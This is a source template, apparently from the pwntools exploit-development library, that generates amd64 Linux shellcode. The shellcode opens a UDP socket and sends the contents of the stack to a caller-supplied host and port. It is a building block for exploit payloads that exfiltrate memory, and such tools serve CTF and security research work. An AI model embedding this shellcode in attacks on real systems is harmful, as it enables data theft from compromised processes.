<%
from pwnlib.shellcraft.amd64 import pushstr
from pwnlib.shellcraft.amd64.linux import socket, syscall
from pwnlib.util.net import sockaddr
%>

<%page args="host, port, network = 'ipv4', size = 1024"/>
<%docstring>
    Send stack content to remote peer over UDP.
    Network is either 'ipv4' or 'ipv6'.
    Leaves the connected socket in rbp.
</%docstring>
<%
    sockaddr, addr_len, address_family = sockaddr(host, port, network)
%>\
    /* open new socket */
    ${socket(network, 'udp')}

    /* Put socket into rbp */
    mov rbp, rax

    /* Create address structure on stack */
    ${pushstr(sockaddr, False)}

/* Connect the socket */
    ${syscall('SYS_sendto', 'rbp', 'rsp', size, 0, 'rsp', addr_len)}